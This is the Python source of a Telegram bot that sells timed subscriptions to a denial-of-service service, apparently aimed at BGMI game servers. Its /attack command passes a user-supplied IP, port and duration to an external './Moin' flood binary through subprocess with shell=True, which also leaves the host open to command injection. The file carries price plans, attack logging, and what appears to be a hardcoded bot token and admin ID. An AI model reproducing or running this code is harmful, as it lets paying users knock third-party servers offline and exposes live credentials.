import telebot
import subprocess
import datetime
import os
# KALIAYT JOIN TO MORE UPDATES 
# Insert your Telegram bot token here
bot = telebot.TeleBot('7668634322:AAG9VeqvWU09XSQJLkPuQoBHdRCTSF25AVw')
# DEVELOPER --> @Pyschoboi 
# Admin user IDs
admin_id = ["5172005896"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"

# File to store command logs
LOG_FILE = "log.txt"
# KALIAYT JOIN TO MORE UPDATES 
# Define subscription periods in seconds
subscription_periods = {
    '1𝗺𝗶𝗻': 10,
    '1𝗵𝗼𝘂𝗿': 50,
    '6𝗵𝗼𝘂𝗿𝘀': 100,
    '12𝗵𝗼𝘂𝗿𝘀': 150,
    '1𝗱𝗮𝘆': 180,
    '2𝗱𝗮𝘆𝘀': 250,
    '3𝗱𝗮𝘆𝘀': 280,
    '7𝗱𝗮𝘆𝘀': 450,
    '1𝗺𝗼𝗻𝘁𝗵': 500,
    '2𝗺𝗼𝗻𝘁𝗵𝘀': 1000
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
# KALIAYT JOIN TO MORE UPDATES 
# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"𝗘𝗿𝗿𝗼𝗿 𝗽𝗮𝗿𝘀𝗵𝗶𝗻𝗴 𝘁𝗼 𝘂𝘀𝗲𝗿 {user_id}: {expiry_str}")
                else:
                    print(f"𝗜𝗻𝘃𝗶𝗮𝗹𝗱 𝗹𝗶𝗻𝗲 𝗶𝗻 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗳𝗶𝗹𝗲: {line}")
    except FileNotFoundError:
        pass
    return subscriptions

# Function to write subscriptions to the file
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
# KALIAYT JOIN TO MORE UPDATES 
# List to store allowed user IDs
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱."
            else:
                file.truncate(0)
                response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿 𝘀𝘂𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆."
    except FileNotFoundError:
        response = "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝗰𝗹𝗲𝗮𝗿."
    return response
# KALIAYT JOIN TO MORE UPDATES
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to check if a user is subscribed
def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False

# Function to add or update a user's subscription
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"𝗨𝘀𝗲𝗿 {user_to_add} 𝗮𝗱𝗱𝗲𝗱 𝘄𝗶𝘁𝗵 {period} 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🎉"
            else:
                response = "𝗜𝗻𝘃𝗮𝗶𝗹𝗱 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗽𝗲𝗿𝗶𝗼𝗱. 𝗨𝘀𝗲: 1𝗺𝗶𝗻, 1𝗵𝗼𝘂𝗿, 6𝗵𝗼𝘂𝗿, 12𝗵𝗼𝘂𝗿, 1𝗱𝗮𝘆, 2𝗱𝗮𝘆𝘀, 3𝗱𝗮𝘆𝘀, 7𝗱𝗮𝘆𝘀, 1𝗺𝗼𝗻𝘁𝗵, 𝗼𝗿 2𝗺𝗼𝗻𝘁𝗵𝘀."
        else:
            response = "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝘂𝘀𝗲𝗿 𝗶𝗱 𝗮𝗻𝗱 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗽𝗲𝗿𝗶𝗼𝗱 𝘁𝗼 𝗮𝗱𝗱."
    else:
        response = "𝗢𝗡𝗟𝗬 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗗𝗢 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆."
            else:
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁."
        else:
            response = "𝗣𝗹𝗲𝗮𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝗨𝘀𝗲𝗿 𝗶𝗱 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "𝗢𝗡𝗟𝗬 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗗𝗢 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            expiry = subscriptions.get(user_id, "𝗡𝗼 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻")
                            response += f"- @{username} (𝗜𝗗: {user_id}) | 𝗘𝘅𝗽𝗶𝗿𝗲: {expiry}\n"
                        except Exception as e:
                            response += f"- 𝗨𝘀𝗲𝗿 𝗶𝗱: {user_id} | 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {subscriptions.get(user_id, '𝗡𝗼 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻')}\n"
                else:
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱."
        except FileNotFoundError:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "𝗢𝗡𝗟𝗬 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗗𝗢 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱."
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱."
            bot.reply_to(message, response)
    else:
        response = "𝗢𝗡𝗟𝗬 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗗𝗢 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗."
        bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"⚡ **𝗢𝗣𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗦𝗧𝗔𝗥𝗧𝗘𝗗, 𝗕𝗛𝗔𝗜𝗟𝗢𝗚!** ⚡\n"
f"🎯 **𝗧𝗮𝗿𝗴𝗲𝘁:** `{target}`\n"
f"🔗 **𝗣𝗼𝗿𝘁:** `{port}`\n"
f"⏳ **𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻:** `{time} seconds`\n"
f"🎮 **𝗠𝗼𝗱𝗲:** `𝗕𝗚𝗠𝗜`\n\n"
f"🚀 **𝗝𝗮𝗮𝗻 𝗹𝗮𝗴𝗮 𝗱𝗼, 𝗸𝗼𝗶 𝗻𝗮𝗵𝗶 𝗯𝗮𝗰𝗲𝗴𝗮 𝗯𝗵𝗮𝗱𝘄𝗮!** 🚀\n"
f"🌪️ **𝗧𝗮𝗿𝗴𝗲𝘁 𝗸𝗼 𝗰𝗵𝗵𝗼𝗱𝗻𝗮 𝗺𝗮𝘁, 𝗝𝗮𝗹𝗱𝗶 𝗸𝗮𝗿 𝗻𝗶𝗽𝘁𝗮!** 🌪️"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("𝗦𝗨𝗣𝗣𝗢𝗥𝗧", url="https://t.me/+xvcuj12arrAwMGI1")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)


# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "⏳ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗕𝗔𝗕𝗬 ⏳\n🔺𝗪𝗔𝗜𝗧 10 𝗠𝗜𝗡𝗨𝗧𝗘𝗦🔻"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 240:
                response = "𝗧𝗶𝗺𝗲 𝗶𝘀 𝘃𝗲𝗿𝘆 𝗵𝗶𝗴𝗵 \n\n𝗧𝗿𝘆 𝘁𝗼 --> 240✅ \n𝗕𝗲𝗴𝗶𝗿𝗲 𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Moin {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"🔺𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗘𝗟𝗧𝗘𝗗🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}"
        else:
            response = "💠𝗜𝘁𝘀 𝘁𝗶𝗺𝗲 𝘁𝗼 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸💠 \n\n/attack <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>\n\n𝗥𝗲𝗮𝗱𝘆 𝘁𝗼 𝗳𝘂𝗰𝗸 𝗯𝗴𝗺𝗶"  # Updated command syntax
    else:
        response = "𝗬𝗼𝘂𝗿 𝗻𝗼𝘁 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 "

    bot.reply_to(message, response)

# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 


# KALIAYT JOIN TO MORE UPDATES 






# KALIAYT JOIN TO MORE UPDATES 






# Add /mylogs command to display logs recorded for bgmi and website commands


@bot.message_handler(commands=['plan'])
def show_plan(message):
    response = "𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻:\n"
    response += "- 𝗕𝗮𝘀𝗶𝗰 𝗣𝗹𝗮𝗻: $10/𝗺𝗼𝗻𝘁𝗵\n"
    response += "- 𝗣𝗿𝗼 𝗣𝗹𝗮𝗻: $20/𝗺𝗼𝗻𝘁𝗵\n"
    response += "- 𝗣𝗿𝗲𝗺𝘂𝗶𝗺 𝗣𝗹𝗮𝗻: $30/𝗺𝗼𝗻𝘁𝗵\n"
    response = "- 𝗗𝗠 𝗠𝗘 -- @MXDprofessor \n"

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = "𝗥𝘂𝗹𝗲𝘀:\n"
    response += "𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐫𝐞 𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐭𝐨 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐚𝐫𝐠𝐞𝐭𝐬 𝐨𝐧𝐥𝐲.\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids and is_subscribed(user_id):
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"𝗨𝘀𝗲𝗿𝗜𝗱: {user_id}" in log]
                if user_logs:
                    response = "𝗬𝗼𝘂𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀:\n" + "".join(user_logs)
                else:
                    response = "𝗡𝗼 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱 𝗳𝗼𝗿 𝘆𝗼𝘂."
        except FileNotFoundError:
            response = "𝗡𝗼 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱."
    else:
        response = "𝗨𝗻𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝘁𝗼 𝘂𝘀𝗲 𝗗𝗺 𝘁𝗼 𝗯𝗼𝘁 𝗳𝗮𝘁𝗵𝗲𝗿"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "𝗔𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        response += "/allusers - 𝗟𝗶𝘀𝘁 𝗼𝗳 𝗮𝗹𝗹 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀\n"
        response += "/clearlogs - 𝗖𝗹𝗲𝗮𝗿 𝗮𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀\n"
        response += "/remove <𝘂𝘀𝗲𝗿_𝗶𝗱> - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝘂𝘀𝗲𝗿\n"
        bot.reply_to(message, response)
    else:
        response = "𝗢𝗡𝗟𝗬 𝗣𝗔𝗣𝗔 𝗖𝗔𝗡 𝗗𝗢 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝗬𝗼𝘂𝗿 𝘁𝗲𝗹𝗴𝗿𝗮𝗺 𝗶𝗱: `{user_id}`"
    bot.reply_to(message, response, parse_mode='Markdown')
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 


# KALIAYT JOIN TO MORE UPDATES 

# KALIAYT JOIN TO MORE UPDATES 


@bot.message_handler(commands=['canary'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝗖𝗮𝗻𝗮𝗿𝘆 𝗮𝗽𝗸 --> https://t.me/+xvcuj12arrAwMGI1"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['MADARA'])
def show_help(message):
    response = """𝗜 𝗸𝗻𝗼𝘄 𝘆𝗼𝘂𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 --> 𝗠𝗔𝗗𝗔𝗥𝗔 \n𝗕𝗨𝗧 𝗛𝗜𝗦 𝗕𝗢𝗧 𝗙𝗔𝗧𝗛𝗘𝗥 𝗜𝗦 @MADARA_SHER \n𝗢𝗪𝗡𝗘𝗥 𝗜𝗦 @XDprofessor
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('𝗨𝗣𝗗𝗔𝗧𝗘𝗦', url='https://t.me/+xvcuj12arrAwMGI1'),
        telebot.types.InlineKeyboardButton('𝗦𝗨𝗣𝗣𝗢𝗥𝗧', url='https://t.me/+xvcuj12arrAwMGI1')
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝗛𝗘𝗬 𝗛𝗜𝗦 𝗬𝗢𝗨𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 👋 {user_name}!\n\n'
    response += '𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗽𝗿𝗲𝗺𝘂𝗶𝗺 𝗾𝘂𝗮𝗹𝗶𝘁𝘆 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸\n\n'
    response += '/id :--> 𝗚𝗲𝘁 𝘆𝗼𝘂𝗿 𝘁𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗶𝗱\n'
    response += '/help :--> 𝗸𝗻𝗼𝘄 𝗼𝘁𝗵𝗲𝗿 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀\n'
    response += '/attack :--> 𝗹𝗮𝘂𝗻𝗰𝗵 𝗮𝘁𝘁𝗮𝗰𝗸\n'
    response += '/mylogs :--> 𝗩𝗶𝗲𝘄 𝗿𝗲𝗰𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸𝘀\n'
    response += '/plan :--> 𝗩𝗶𝗲𝘄 𝗽𝗿𝗶𝗰𝗲 𝘁𝗼 𝗽𝗿𝘀𝗼𝗻𝗮𝗹\n'
    response += '/canary :--> 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗰𝗮𝗻𝗮𝗿𝘆 𝗮𝗽𝗸\n'
    response += '/admincmd :--> 𝗩𝗶𝗲𝘄 𝗮𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀\n\n'
    response += '𝗙𝗶𝗿 𝗵𝗲𝗹𝗽 𝗮𝗻𝗱 𝘂𝗽𝗱𝗮𝘁𝗲 𝗰𝗹𝗶𝗰𝗸 𝗯𝗲𝗹𝗼𝘄 𝗯𝘂𝘁𝘁𝗼𝗻\n'
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('𝗨𝗣𝗗𝗔𝗧𝗘𝗦', url='https://t.me/+xvcuj12arrAwMGI1'),
        telebot.types.InlineKeyboardButton('𝗦𝗨𝗣𝗣𝗢𝗥𝗧', url='https://t.me/+xvcuj12arrAwMGI1')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)

# KALIAYT JOIN TO MORE UPDATES 

# KALIAYT JOIN TO MORE UPDATES 

# KALIAYT JOIN TO MORE UPDATES 
# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
# KALIAYT JOIN TO MORE UPDATES 
# KALIAYT JOIN TO MORE UPDATES 
